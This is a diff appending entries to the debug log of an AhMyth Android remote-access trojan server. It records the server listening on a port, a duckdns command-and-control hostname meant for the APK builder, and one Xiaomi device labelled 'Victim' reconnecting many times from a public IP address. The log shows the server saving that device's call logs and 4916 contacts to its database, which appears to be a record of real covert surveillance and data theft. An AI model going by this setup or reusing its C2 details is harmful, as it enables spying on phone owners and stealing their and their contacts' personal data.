@@ -256,3 +256,65 @@
 [2026-02-08T03:22:50.748Z] Server Starting...
 [2026-02-08T03:22:50.749Z] Log file path: D:\Dev\Projects\Android\Android-RAT-master\SystemUpdate\AhMyth-Server\app\server_debug.log
 [2026-02-08T03:22:50.751Z] ✅ Database and Export Manager initialized
+[2026-02-08T03:29:28.606Z] Server Starting...
+[2026-02-08T03:29:28.607Z] Log file path: D:\Dev\Projects\Android\Android-RAT-master\SystemUpdate\AhMyth-Server\app\server_debug.log
+[2026-02-08T03:29:28.609Z] ✅ Database and Export Manager initialized
+[2026-02-08T03:29:33.790Z] Server is now listening on port: 42474
+[2026-02-08T03:29:33.791Z] IMPORTANT: Use ahmythserver.duckdns.org in APK Builder for INTERNET monitoring
+[2026-02-08T03:29:36.071Z] New Socket.IO connection! ID: /#I24RH_AGe61Cfl4uAAAA IP: ::ffff:217.138.220.122
+[2026-02-08T03:29:36.072Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T03:29:36.074Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T03:30:16.025Z] 📞 Saving 3 call logs to database for e702c6c3ca97f8de
+[2026-02-08T03:30:48.438Z] 👥 Saving 4916 contacts to database for e702c6c3ca97f8de
+[2026-02-08T03:31:27.170Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T03:31:27.175Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T03:31:29.215Z] New Socket.IO connection! ID: /#oSkrOwAVsfCjR-xLAAAB IP: ::ffff:217.138.220.122
+[2026-02-08T03:31:29.216Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T03:31:29.223Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T03:33:02.595Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T03:33:02.601Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T03:35:07.456Z] New Socket.IO connection! ID: /#CyOHqQB9nIJ5K7L9AAAC IP: ::ffff:217.138.220.122
+[2026-02-08T03:35:07.457Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T03:35:07.465Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T03:36:22.507Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T03:36:22.513Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T03:39:03.531Z] New Socket.IO connection! ID: /#Vccmkh279ypl4-pdAAAD IP: ::ffff:217.138.220.122
+[2026-02-08T03:39:03.532Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T03:39:03.544Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T03:39:48.500Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T03:39:48.519Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T03:40:36.229Z] New Socket.IO connection! ID: /#l8q7hFooe86RvcloAAAE IP: ::ffff:217.138.220.122
+[2026-02-08T03:40:36.230Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T03:40:36.237Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T03:41:20.784Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T03:41:20.791Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T03:43:49.433Z] New Socket.IO connection! ID: /#T7LV9dpXwdotqOeVAAAF IP: ::ffff:217.138.220.122
+[2026-02-08T03:43:49.434Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T03:43:49.443Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T03:45:32.334Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T03:45:32.340Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T03:50:33.430Z] New Socket.IO connection! ID: /#CNEH3GIm0PCOqog9AAAG IP: ::ffff:217.138.220.122
+[2026-02-08T03:50:33.431Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T03:50:33.441Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T03:51:18.001Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T03:51:18.007Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T03:54:38.385Z] New Socket.IO connection! ID: /#oWwFZXDEhmOE8vlmAAAH IP: ::ffff:217.138.220.122
+[2026-02-08T03:54:38.385Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T03:54:38.395Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T03:57:31.979Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T03:57:31.986Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T04:00:47.979Z] New Socket.IO connection! ID: /#6XC4ivo_bvq80c0BAAAI IP: ::ffff:217.138.220.122
+[2026-02-08T04:00:47.979Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T04:00:47.988Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T04:02:09.612Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T04:02:09.619Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T04:06:03.335Z] New Socket.IO connection! ID: /#4gOlBhNt-cDHMXK-AAAJ IP: ::ffff:217.138.220.122
+[2026-02-08T04:06:03.337Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T04:06:03.351Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T04:06:50.840Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T04:06:50.848Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T04:09:56.145Z] New Socket.IO connection! ID: /#DmgsneV0xkGYn3MbAAAK IP: ::ffff:217.138.220.122
+[2026-02-08T04:09:56.147Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T04:09:56.157Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T04:15:07.767Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T04:15:07.775Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
